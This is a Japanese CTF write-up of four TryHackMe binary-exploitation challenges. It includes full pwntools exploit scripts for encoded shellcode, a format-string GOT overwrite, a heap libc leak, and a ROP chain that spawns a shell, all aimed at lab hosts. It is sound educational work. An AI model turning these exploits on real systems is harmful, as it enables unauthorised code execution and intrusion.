# TryPwnMe Two

https://tryhackme.com/room/trypwnmetwo

知らないことはいくら考えても分からないタイプのチャレンジなので、あまり長時間考え過ぎず、ウォークスルーを完全に理解するために時間を使うというスタンスで取り組む。

エクスプロイトのコードを始め、内容の多くは、jaxafed 氏のウォークスルーに大きく依存しています。  
https://jaxafed.github.io/posts/tryhackme-trypwnme_two/

## TryExecMe 2

```c
undefined8 main(void)
{
  char cVar1;
  code *__buf;

  setup();
  banner();
  __buf = (code *)mmap((void *)0xcafe0000,100,7,0x22,-1,0);
  puts("\nGive me your spell, and I will execute it: ");
  read(0,__buf,0x80);
  puts("\nExecuting Spell...\n");
  cVar1 = forbidden(__buf);
  if (cVar1 != '\0') {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  (*__buf)();
  return 0;
}

undefined8 forbidden(long param_1)

{
  ulong local_18;

  local_18 = 0;
  while( true ) {
    if (0x7e < local_18) {
      return 0;
    }
    if ((*(char *)(local_18 + param_1) == '\x0f') && (*(char *)(param_1 + local_18 + 1) == '\x05'))
    {
      puts("Forbidden spell detected!");
      return 1;
    }
    if ((*(char *)(local_18 + param_1) == '\x0f') && (*(char *)(param_1 + local_18 + 1) == '4')) {
      puts("Forbidden spell detected!");
      return 1;
    }
    if ((*(char *)(local_18 + param_1) == -0x33) && (*(char *)(param_1 + local_18 + 1) == -0x80))
    break;
    local_18 = local_18 + 1;
  }
  puts("Forbidden spell detected!");
  return 1;
}
```

3 種類のシェルコードが禁止されている。これにより、単純に /bin/sh を実行するようなシェルコードは成功しないと思われる。

- \x0f\x05 syscall 命令 システムコール（例：execve など）
- \x0f\x34 sysenter 命令 古い Linux カーネル向けシステムコール
- \xcd\x80（= -0x33 と-0x80） int 0x80 命令 もっと古い Linux システムコール

```shell
$ pwn checksec ./tryexecme2
[*] '/home/kali/CTF/0429/materials-trypwnmetwo/TryExecMe2/tryexecme2'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

ギブアップ。

https://jaxafed.github.io/posts/tryhackme-trypwnme_two/

- 特定のバイト値を含まないようにシェルコードを生成することが可能。
- xor, rol, decoder stub などのテクニックで自己復号する形になっている。
- 今回のフィルタリングでは \x0f, \xcd の 2 文字を避ければ十分。

```python
>>> from pwn import *
>>> shellcode = asm(shellcraft.sh())
... encoded_shellcode = encode(shellcode, avoid=b"\x0f\xcd")
...
>>> print(encoded_shellcode)
b'\xd9\xd0\xfc\xd9t$\xf4^\x83\xc6\x18\x89\xf7\xac\x93\xac(\xd8\xaa\x80\xeb\xacu\xf5\x8a\xf4d\xcc4\x9c\xe7\x16\xe7\x16\xa4\xd3\xb5(/\x97Eth\xca$\x8d\xf5cp\xf9\x18\xfb\xebS\x9d\x9e|}\x93\x94\x1d\x1e\xefpa\x95\x126\x1b\x8d\xd9BWX\xa4\xa5\xf5&\xb0y\xfcM\xa0\n\xa9\xad\xa6\xffkl8\x19]\xae\x9c%\xfd\xdeIz\xd4\xa6\x83\xed\x86\x91\x07_i6\xefo\xac\x00'
```

```sh
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

r = remote("10.10.66.255", 5002)

# Generate shellcode to spawn a shell
shellcode = asm(shellcraft.sh())

# Encode the shellcode to avoid 0x0f and 0xcd
encoded_shellcode = encode(shellcode, avoid=b"\x0f\xcd")

r.recvuntil(b"Give me your spell, and I will execute it: \n")
r.sendline(encoded_shellcode)
r.interactive("$ ")
```

## Not Specified 2

```sh
$ ls
ld-linux-x86-64.so.2  libc.so.6  notspecified2
```

```c
void main(void)
{
  long in_FS_OFFSET;
  char local_218 [520];
  undefined8 local_10;

  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts("Please provide your username:");
  read(0,local_218,0x200);
  printf("Thanks ");
  printf(local_218);
  FUN_004010c0(0x539);
  return;
}

void FUN_004010c0(int param_1)
{
                    /* WARNING: Subroutine does not return */
  exit(param_1);
}
```

- 文字列フォーマット脆弱性がある
- FUN_004010c0 関数の中で exit を実行している

```sh
$ pwn checksec ./notspecified2
[*] '/home/kali/ctf/pwnme2/materials-trypwnmetwo/NotSpecified2/notspecified2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

GOT(exit)を、シェル起動の libc ガジェットアドレスに書き換える方針。  
それには 1 回目のペイロードで libc のベースアドレスを特定し、2 回目のペイロードで GOT(exit)にガジェットアドレスをセットする必要があるが、ユーザー入力は 1 回しかない。

そのため、1 回目のペイロードでは、libc のベースアドレス特定と同時に、GOT(exit)に main 関数のアドレスをセットする必要がある。No PIE 設定で main 関数のアドレスが固定のため、この方法が可能になる。

```sh
$ python -c "print('ABCDEFGH|' + '|'.join(['%d:%%p' % i for i in range(1,20)]))"
ABCDEFGH|1:%p|2:%p|3:%p|4:%p|5:%p|6:%p|7:%p|8:%p|9:%p|10:%p|11:%p|12:%p|13:%p|14:%p|15:%p|16:%p|17:%p|18:%p|19:%p
```

```sh
Please provide your username:
Thanks ABCDEFGH|1:0x7fffffffb950|2:(nil)|3:0x7ffff7d14a37|4:0x7|5:0x7ffff7fc9040|6:0x4847464544434241|7:0x3a327c70253a317c|8:0x7c70253a337c7025|9:0x253a357c70253a34|10:0x377c70253a367c70|11:0x70253a387c70253a|12:0x30317c70253a397c|13:0x253a31317c70253a|14:0x7c70253a32317c70|15:0x34317c70253a3331|16:0x253a35317c70253a|17:0x7c70253a36317c70|18:0x38317c70253a3731|19:0x253a39317c70253a

pwndbg> vmmap libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
          0x404000           0x405000 rw-p     1000   5000 notspecified2
►   0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 libc.so.6
►   0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000  28000 libc.so.6
►   0x7ffff7dbd000     0x7ffff7e15000 r--p    58000 1bd000 libc.so.6
►   0x7ffff7e15000     0x7ffff7e19000 r--p     4000 214000 libc.so.6
►   0x7ffff7e19000     0x7ffff7e1b000 rw-p     2000 218000 libc.so.6
    0x7ffff7e1b000     0x7ffff7e28000 rw-p     d000      0 [anon_7ffff7e1b]


pwndbg> p/x 0x7ffff7d14a37 - 0x7ffff7c00000
$2 = 0x114a37
```

- 入力バッファは 6 番目に対応している。これを GOT の上書きに使える。
- 3 番目に libc 内のアドレスが出ている。これをもとに libc のベースアドレスを計算できる。

```sh
$ one_gadget ./libc.so.6
0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebd52 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebda8 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebdaf execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebdb3 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

※最初の 2 つは OK だが、残りは機能しなかった。

https://jaxafed.github.io/posts/tryhackme-trypwnme_two/ のコード。

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./notspecified2", checksec=False)

r = remote("10.10.8.174", 5000)

# Leak an address from libc
payload = b"%3$pBBBB"

# Overwrite the last two bytes of exit@got.plt (0x401070) with \x12\x80
# This redirects execution to 0x401280 (address of main)
payload += b"%110x%11$hhn%146c%12$hhn".ljust(32, b"A")
payload += p64(binary.got["exit"])
payload += p64(binary.got["exit"] + 1)

r.recvuntil(b"Please provide your username:\n")
r.sendline(payload)

# Parse the leaked address and calculate libc base
libc_leak = int(r.recvuntil(b"BBBB").split(b" ")[1][:-4], 16)
libc_base = libc_leak - 0x114a37

# Overwrite the GOT entry for exit with a one-gadget RCE
payload = fmtstr_payload(6, {binary.got["exit"]: libc_base + 0xebcf5})

r.recvuntil(b"Please provide your username:\n")
r.sendline(payload)
r.recv()
r.interactive("$ ")
```

2 回目のペイロードで GOT をガジェットアドレスに書き換えている部分は分かるが、1 回目の main 関数のアドレスに書き換えている部分が難解。

### 何をしているのか？

```python
# Overwrite the last two bytes of exit@got.plt (0x401070) with \x12\x80
# This redirects execution to 0x401280 (address of main)
payload += b"%110x%11$hhn%146c%12$hhn".ljust(32, b"A")
payload += p64(binary.got["exit"])
payload += p64(binary.got["exit"] + 1)
```

前半と後半に分解して考える。

```
printf("......%11$hhn", p64(binary.got["exit"]))
```

は、got["exit"] のアドレス（printf 第 11 引数として渡す）に、"%11$hhn"以前に出力した文字数の下位 1 バイト書き込む。

`"%3$pBBBB"`の部分の数え方は、8 バイトではなく、`0x7ffff7d14a37` の 14 バイト + 4 バイト = 18 バイト。  
また、`%110x`は 110 バイト。
したがって、18 + 110 = 128（0x80）が、got["exit"] のアドレスに書き込まれる。

同様に、

```
printf("......%12$hhn", p64(binary.got["exit"]+1))
```

の部分は、128 + 146 = 274（0x112）の下位 1 バイトである 0x12 を、got["exit"]+1 のアドレスに書き込んでいる。

### なぜ 11 番目と 12 番の引数を指定しているのか？

```c
payload = b"%3$pBBBB"
payload += b"%110x%11$hhn%146c%12$hhn".ljust(32, b"A")
```

この時点で、payload は次の内容になっている。

```
%3$pBBBB%110x%11$hhn%146c%12$hhnAAAAAAAA
```

この長さは 40 バイト。  
x64 Linux アセンブリでは、第 6 引数までがレジスタ、第 7 引数以降がスタックになる。  
printf 呼び出しで 8 バイトプッシュされていることを考慮して、7，8，9，10 引数のそれぞれ 8 バイトずつ足すと、計 40 バイト。  
したがって、この文字列の直後は第 11 引数として扱われる。

その証拠に、末尾 8 バイトの AAAAAAAA を除去すると、第 10、第 11 引数指定でエクスプロイトが成功することを確認できる。

```python
payload += b"%110x%10$hhn%146c%11$hhn"
```

## Try a Note

```sh
$ ls
ld-2.35.so  libc.so.6  tryanote
```

```sh
$ pwn checksec ./tryanote
[*] '/home/kali/ctf/pwnme2/materials-trypwnmetwo/TryaNote/tryanote'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```c
undefined8 main(void)
{
  int iVar1;

  setup();
  banner();
  while( true ) {
    menu();
    iVar1 = read_opt();
    if (iVar1 == 0) break;
    switch(iVar1) {
    case 1:
      create();
      break;
    case 2:
      show();
      break;
    case 3:
      update();
      break;
    case 4:
      delete();
      break;
    case 5:
      win();
    }
  }
  return 0;
}
```

- ヒープメモリの管理プログラム
- create 時に malloc でヒープ確保し、データも同時に格納する
- 最大 32 個のエントリ(index)、各エントリの最大サイズは 4096 バイト
- update でヒープサイズは変わらない

win 関数が定義されている。

```c
void win(void)
{
  uint uVar1;
  long in_FS_OFFSET;
  undefined8 local_20;
  code *local_18;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Enter the index:");
  uVar1 = read_opt();
  if ((uVar1 < 0x20) && (*(long *)(chunks + (ulong)uVar1 * 8) != 0)) {
    puts("Enter the data:");
    __isoc99_scanf(&DAT_001022f4,&local_20);
    local_18 = (code *)**(undefined8 **)(chunks + (ulong)uVar1 * 8);
    (*local_18)(local_20);
  }
  else {
    puts("Invalid index.");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

ヒープに格納されている値を関数ポインタとして、入力した値を引数として関数を呼び出している。

下記の方針になる。

- "/bin/sh"文字列のアドレスを引数として、system 関数を呼び出す。
- その前に、libc ベースアドレスの取得が必要。

ここまでは分かるが、ベースアドレスの漏洩方法が分からない。

https://jaxafed.github.io/posts/tryhackme-trypwnme_two/#try-a-note のソースから学ぶ。

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
libc = ELF("./libc.so.6", checksec=False)

r = remote("10.10.62.203", 5001)

def create(size, content):
    r.sendlineafter(b'\n>>', b'1')
    r.sendlineafter(b'Enter entry size:\n', str(size).encode())
    r.sendlineafter(b'Enter entry data:\n', content)

def show(index):
    r.sendlineafter(b'\n>>', b'2')
    r.sendlineafter(b'Enter entry index:\n', str(index).encode())

def update(index, content):
    r.sendlineafter(b'\n>>', b'3')
    r.sendlineafter(b'Enter entry index:\n', str(index).encode())
    r.sendlineafter(b'Enter data:\n', content)

def delete(index):
    r.sendlineafter(b'\n>>', b'4')
    r.sendlineafter(b'Enter entry index:\n', str(index).encode())

def win(index, content):
    r.sendlineafter(b'\n>>', b'5')
    r.sendlineafter(b'Enter the index:', str(index).encode())
    r.sendlineafter(b'Enter the data:', content.encode())


# Create two large chunks and free the first one
create(0x1000, b"A")
create(0x1000, b"A")
delete(0)

# Leak the address and calculate the libc base address
show(0)
libc_base = u64(r.recvline().rstrip().ljust(8, b"\x00")) - 0x219ce0
libc.address = libc_base

# Write system address to a note
create(0x200, p64(libc.sym["system"]))

# Execute system("/bin/sh") by triggering the win function
win(2, str(next(libc.search(b"/bin/sh"))))

r.recv()
r.interactive("$ ")
```

ベースアドレス露出について、初見のテクニックが使われている。

### libc の malloc/free の仕様

解放したヒープチャンクが unsorted bin に入れられると、そのチャンクの fd/bk フィールドに libc の main_arena 内のポインタが書き込まれる。

そのため、free した後のメモリ内容を露出することで、libc 内のアドレスをリークすることができる。

unsorted bin に入れられるにはある程度チャンクが大きい必要があり、概ね、1032 バイトより大きい場合に入れられる。

malloc.c

```c
static INTERNAL_SIZE_T
_int_free_create_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T size,
			mchunkptr nextchunk, INTERNAL_SIZE_T nextsize)
{
  if (nextchunk != av->top)
    {
      /* get and clear inuse bit */
      bool nextinuse = inuse_bit_at_offset (nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
	unlink_chunk (av, nextchunk);
	size += nextsize;
      } else
	clear_inuse_bit_at_offset(nextchunk, 0);

      mchunkptr bck, fwd;

      if (!in_smallbin_range (size))
        {
          /* Place large chunks in unsorted chunk list.  Large chunks are
             not placed into regular bins until after they have
             been given one chance to be used in malloc.

             This branch is first in the if-statement to help branch
             prediction on consecutive adjacent frees. */
          bck = unsorted_chunks (av);
          fwd = bck->fd;
          if (__glibc_unlikely (fwd->bk != bck))
            malloc_printerr ("free(): corrupted unsorted chunks");
          p->fd_nextsize = NULL;
          p->bk_nextsize = NULL;
        }
```

## Slow Server

```sh
$ pwn checksec ./slowserver
[*] '/home/kali/ctf/pwnme2/materials-trypwnmetwo/SlowServer/slowserver'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```c
undefined8 main(void)
{
  int iVar1;
  undefined1 local_448 [1023];
  undefined1 local_49;
  socklen_t local_3c;
  sockaddr local_38;
  sockaddr local_28;
  int local_10;
  int local_c;

  local_c = socket(2,1,0);
  if (local_c == -1) {
    perror("Socket creation failed");
  }
  else {
    local_28.sa_family = 2;
    local_28.sa_data._0_2_ = htons(0x15b3);
    local_28.sa_data[2] = '\0';
    local_28.sa_data[3] = '\0';
    local_28.sa_data[4] = '\0';
    local_28.sa_data[5] = '\0';
    iVar1 = bind(local_c,&local_28,0x10);
    if (iVar1 == -1) {
      perror("Bind failed");
    }
    else {
      iVar1 = listen(local_c,10);
      if (iVar1 == -1) {
        perror("Listen failed");
      }
      else {
        printf("Server running on http://localhost:%d\n",0x15b3);
        while( true ) {
          local_3c = 0x10;
          local_10 = accept(local_c,&local_38,&local_3c);
          if (local_10 == -1) break;
          read(local_10,local_448,0x3ff);
          local_49 = 0;
          handle_request(local_10,local_448);
          close(local_10);
        }
        perror("Accept failed");
      }
    }
  }
  return 1;
}

void handle_request(int param_1,char *param_2)
{
  int iVar1;
  char *__s1;
  char *pcVar2;
  void *__buf;

  __s1 = strtok(param_2," \t\r\n");
  pcVar2 = strtok((char *)0x0," \t\r\n");
  strtok((char *)0x0," \t\r\n");
  iVar1 = strcmp(__s1,"GET");
  if (iVar1 == 0) {
    handle_get_request(param_1);
  }
  else {
    iVar1 = strcmp(__s1,"DEBUG");
    if (iVar1 == 0) {
      handle_debug_request(param_1,pcVar2);
    }
    else {
      iVar1 = strcmp(__s1,"POST");
      if (iVar1 == 0) {
        __buf = malloc(0x400);
        read(param_1,__buf,0x400);
        *(undefined1 *)((long)__buf + 0x400) = 0;
        handle_post_request(param_1,pcVar2);
        free(__buf);
      }
      else {
        printf("blizzarddddddd");
      }
    }
  }
  return;
}

void handle_debug_request(int param_1,char *param_2)
{
  size_t __n;
  char local_408 [42];
  undefined1 local_3de;

  if (param_2 == (char *)0x0) {
    write(param_1,"Socket Connection Error",0x16);
  }
  else {
    sprintf(local_408,param_2);
    local_3de = 0;
    __n = strlen(local_408);
    write(param_1,local_408,__n);
  }
  return;
}

void handle_post_request(undefined8 param_1,void *param_2)
{
  undefined1 local_18 [16];

  memcpy(local_18,param_2,0x400);
  return;
}
```

- DEBUG ハンドラは、文字列フォーマット脆弱性の可能性がある。
- POST ハンドラは、16 バイトバッファに 1024 バイト書き込んでいるので、明らかにバッファが壊れる。
- strtok() 関数はスレッド非安全だが、このプログラムはシングルスレッドなので関係ないと思われる。

POST を実行

```sh
$ nc localhost 5555
POST aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa
```

25 バイト目に ret アドレスがあることが分かる。（バッファ 16 バイト + RBP 8 バイト）

```sh
 RSP  0x7fffffffd828 ◂— 0x6161616861616167 ('gaaahaaa')
 RIP  0x55555555563d (handle_post_request+239) ◂— ret
────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────
 ► 0x55555555563d <handle_post_request+239>    ret                                <0x6161616861616167>
    ↓
─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd828 ◂— 0x6161616861616167 ('gaaahaaa')
```

DEBUG は文字列フォーマット脆弱性がある。

```python
from pwn import *

context.log_level = 'error'

for i in range(1,21):
    p = remote('localhost', 5555)
    payload = f"DEBUG %{i}$p".encode()
    p.sendline(payload)
    output = p.recvline()
    print(f"{i}: " + output.decode())
    p.close()
```

```sh
$ python ./list.py
1: 0x7fffffffd876
2: (nil)
3: 0x7fffffffd870
4: (nil)
5: 0x7fffffffd876
6: 0x400000027
7: 0x3030303030347830
8: 0x3837343330333033
9: 0x3333
10: 0x555555559010
11: 0x7fffffffd3c0
12: 0x7ffff70000bc
13: (nil)
14: 0x5555555592a0
15: 0x3f
16: 0xffffffffffffffc0
17: 0x7ffff7f93fd0
18: 0x7ffff7f95ac0
19: 0x3f
20: 0xffffffffffffffc0
```

17, 18 番目は libc.so.6 内のアドレスを指している。

```sh
pwndbg> info symbol 0x7ffff7f93fd0
_IO_file_jumps in section .data.rel.ro of /lib/x86_64-linux-gnu/libc.so.6
pwndbg> info symbol 0x7ffff7f95ac0
main_arena in section .data of /lib/x86_64-linux-gnu/libc.so.6
```

先頭からのオフセット

```sh
pwndbg> p/x 0x7ffff7f93fd0 - 0x7ffff7dae000
$1 = 0x1e5fd0
pwndbg> p/x 0x7ffff7f95ac0 - 0x7ffff7dae000
$2 = 0x1e7ac0
```

しかし、これはローカルの libc なのでそのままでは使えない。  
サーバーの libc バージョンを探って、バイナリをどこからかダウンロードする。

・・・と考えたのだが、リモートのアドレスを表示してもそれが何のシンボルを指しているか分からないので行き詰ってウォークスルーを見た。

https://jaxafed.github.io/posts/tryhackme-trypwnme_two/#slow-server

基本的な方針として、

- libc はあきらめ、slowserver バイナリのみで ROP チェーンを作る。
- リモートとローカルで、同じインデックスで、同じシンボルを指していると思われる部分を洗い出す。

```python
from pwn import *

context.log_level = 'error'

for i in range(1,200):
    p1 = remote('localhost', 5555)
    p2 = remote('10.10.33.100', 5555)

    payload = f"DEBUG %{i}$p".encode()

    p1.sendline(payload)
    p2.sendline(payload)

    output1 = p1.recvline().strip().decode()
    output2 = p2.recvline().strip().decode()

    # アドレスの下3桁が一致する場合のみ出力する
    if output1[-3:] == output2[-3:]:
      print(f"{i}: " + output1 + " : " + output2)

    p1.close()
    p2.close()
```

```sh
$ python ./fuzz.py
7: 0x3030303030347830 : 0x6264623538347830
9: 0x3333 : 0x781a1d003333
71: (nil) : (nil)
101: (nil) : (nil)
122: 0x15b3 : 0x15b3
123: 0x10 : 0x10
136: 0x555555555780 : 0x569afb3a3780
144: 0x555555555964 : 0x569afb3a3964
145: 0x3125004755424544 : 0x3125004755424544
146: 0x7f0070243634 : 0x780070243634
151: (nil) : (nil)
160: (nil) : (nil)
183: (nil) : (nil)
186: (nil) : (nil)
199: (nil) : (nil)
```

136, 144 番目に、slowserver バイナリ内のアドレスが出てきた。

どちらでも良いかもしれないが、136 番目のオフセットを使う。

```sh
pwndbg> info symbol 0x555555555780
handle_request + 173 in section .text of /home/kali/ctf/pwnme2/materials-trypwnmetwo/SlowServer/slowserver
pwndbg> info symbol 0x555555555964
main + 326 in section .text of /home/kali/ctf/pwnme2/materials-trypwnmetwo/SlowServer/slowserver

pwndbg> vmmap slowserver
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
►   0x555555554000     0x555555555000 r--p     1000      0 slowserver
►   0x555555555000     0x555555556000 r-xp     1000   1000 slowserver
►   0x555555556000     0x555555557000 r--p     1000   2000 slowserver
►   0x555555557000     0x555555558000 r--p     1000   2000 slowserver
►   0x555555558000     0x555555559000 rw-p     1000   3000 slowserver
    0x555555559000     0x55555557a000 rw-p    21000      0 [heap]
pwndbg> p/x 0x555555555780 - 0x555555554000
$2 = 0x1780
```

syscall でシェルを起動するのは、pwn101 で出てきた。必要なのは、

- syscall で execve を実行する。  
  https://filippo.io/linux-syscall-table/ によると、execve はリストの 59 番。rax に 59 を入れて syscall を呼び出す。

- execve の第 1 引数（rdi）に "/bin/sh" が必要。第 2,3 引数（rsi,rdx）は 0。

```c
int execve(const char *pathname, char *const _Nullable argv[],
           char *const _Nullable envp[]);
```

pwn101 のときは `mov qword ptr [rdi], rdx` を使って .bss に文字列を配置する方法だったが、今回はそれが無い。

ウォークスルーの ROP  
https://jaxafed.github.io/posts/tryhackme-trypwnme_two/#slow-server

```python
# Build the start of the payload
payload = b"POST "
payload += b"A" * 16       # Offset to the rbp
payload += b"/bin/sh\x00"  # Overwrite the rbp with /bin/sh string

# Construct the ROP chain to execute execve("/bin/sh", 0, 0)
payload += p64(push_rbp_mov_rbp_rsp_pop_rax)  # Set the value of rbp with the address of /bin/sh
payload += p64(pop_rdi_xor_rdi_rbp)           # Move the address in rbp to rdi (first argument to execve)
payload += p64(0)                             # Set rdi to 0 for xor with rbp
payload += p64(pop_rax)                       # Set rax to 59 (sys_execve syscall number)
payload += p64(execve)
payload += p64(pop_rsi)                       # Set rsi to 0 (second argument to execve)
payload += p64(0)
payload += p64(pop_rdx_pop_r12)               # Set rdx to 0 (third argument to execve, also sets r12 to 0)
payload += p64(0)
payload += p64(0)
payload += p64(syscall)                       # Trigger the syscall
```

- rbp を push することにより rsp が 8 上がり、文字列アドレスを指す
- rsp を rbp にコピーすることにより、rbp が文字列アドレスを指す
- rdi （初期値 0）と rbp の xor を取ることで、rdi に文字列アドレスを入れる

という仕組み。天才か！

どう考えればたどり着くことができたのか、思考を検証してみる。

１．最終的に rdi に文字列アドレスを入れなければならないことを考慮すれば、今回のガジェット構成の場合、まず rbp に文字列アドレスを入れる必要があることがわかる。

```sh
$ ROPgadget --binary ./slowserver | grep rdi
0x000000000000100b : fldcw word ptr [rdi] ; add byte ptr [rax], al ; test rax, rax ; je 0x1016 ; call rax
0x0000000000001635 : insb byte ptr [rdi], dx ; mov byte ptr ds:[rbp - 0x1e], 0 ; nop ; leave ; ret
0x0000000000001816 : pop rdi ; xor rdi, rbp ; ret
0x0000000000001817 : xor rdi, rbp ; ret
```

２．rbp に文字列アドレスを入れるために候補となるガジェットを探す。

```sh
$ ROPgadget --binary ./slowserver | grep rbp
0x0000000000001410 : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret
0x0000000000001411 : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000001412 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret
0x0000000000001806 : cli ; push rbp ; mov rbp, rsp ; pop rax ; ret
0x0000000000001803 : endbr64 ; push rbp ; mov rbp, rsp ; pop rax ; ret
0x0000000000001635 : insb byte ptr [rdi], dx ; mov byte ptr ds:[rbp - 0x1e], 0 ; nop ; leave ; ret
0x0000000000001634 : loopne 0x16a2 ; mov byte ptr ds:[rbp - 0x1e], 0 ; nop ; leave ; ret
0x0000000000001637 : mov byte ptr [rbp - 0x1e], 0 ; nop ; leave ; ret
0x000000000000140c : mov byte ptr [rip + 0x2bfd], 1 ; pop rbp ; ret
0x0000000000001636 : mov byte ptr ds:[rbp - 0x1e], 0 ; nop ; leave ; ret
0x0000000000001808 : mov rbp, rsp ; pop rax ; ret
0x000000000000181b : nop ; pop rbp ; ret
0x0000000000001413 : pop rbp ; ret
0x0000000000001816 : pop rdi ; xor rdi, rbp ; ret
0x0000000000001807 : push rbp ; mov rbp, rsp ; pop rax ; ret
0x000000000000140e : std ; sub eax, dword ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret
0x000000000000140f : sub eax, dword ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000001817 : xor rdi, rbp ; ret
```

現実的には、このうち 4 つだろうか。

```
0x0000000000001808 : mov rbp, rsp ; pop rax ; ret
0x000000000000181b : nop ; pop rbp ; ret
0x0000000000001413 : pop rbp ; ret
0x0000000000001807 : push rbp ; mov rbp, rsp ; pop rax ; ret
```

2 つは rsp からの mov、他の 2 つは、スタックからの pop。

任意のレジスタが指すメモリ上に文字列を置き、そのレジスタを push し、rsp に pop する、という方法はあり得るかもしれないが、それは .bss に文字列を格納するのと同じパターンに属すると考えられる。

rbp に文字列の値を入れて push、rsp で文字列アドレスを指し、それをなんとかして rdi まで持っていくのが定石の 1 つと覚えておくのが良さそう。

### dup2(4, 0), dup2(4, 1)

これで終わりかと思いきやまだ終わりではなく、ソケットのファイルディスクリプタを標準入力と標準出力とつなげる必要がある。つまり、標準入力と標準出力をソケット fd に向ける。

```python
# Build the start of the payload
payload = b"POST "
payload += b"A" * 16       # Offset to the rbp
payload += b"/bin/sh\x00"  # Overwrite rbp with /bin/sh string

# dup2(4, 0) - Redirect file descriptor 4 to stdin (fd 0)
payload += p64(pop_rdi_xor_rdi_rbp) # Set rdi as 4
payload += b"+bin/sh\x00"
payload += p64(pop_rax)             # Set rax to 33 (dup2 syscall number)
payload += p64(dup2)
payload += p64(pop_rsi)             # Set rsi to 0 (stdin)
payload += p64(0)
payload += p64(syscall)             # Trigger the syscall

# dup2(4, 1) - Redirect file descriptor 4 to stdout (fd 1)
payload += p64(pop_rdi_xor_rdi_rbp) # Set rdi as 4
payload += b"+bin/sh\x00"
payload += p64(pop_rax)             # Set rax to 33 (dup2 syscall number)
payload += p64(dup2)
payload += p64(pop_rsi)             # Set rsi to 1 (stdout)
payload += p64(1)
payload += p64(syscall)             # Trigger the syscall
```

`/bin/sh\x00` と `+bin/sh\x00` の xor は 4 になるという仕組みらしい。

確かに、rdi に pop するだけのガジェットは存在せず、rbp との xor を取るしかないので、そうするしかないのだろう。しかしよく思いつくものだと感心する。

```
0x0000000000001816 : pop rdi ; xor rdi, rbp ; ret
0x0000000000001817 : xor rdi, rbp ; ret
```

## 振り返り

本当に多くのことを学んだ。改めて、ウォークスルーの著者である jaxafed 氏に敬意を。

### TryExecMe 2

- 特定バイト値を使わずにシェルコードを生成する方法

### Not Specified 2

- one_gadget
- アドレス露出とアドレス書き換えを 1 ペイロードで実行する方法
- exit@got.plt の 1 バイトずつを 2 回上書きして、main 関数のアドレスを指す方法

### Try a Note

- 解放したヒープチャンクの先頭に libc 内の main_arena のアドレスが残ること

### Slow Server

- 文字列脆弱性で、ローカルとリモートで比較して下 3 桁を比較する方法
- バイナリ本体のみで ROP を実行する方法
- ソケットと標準入出力をつなげる方法
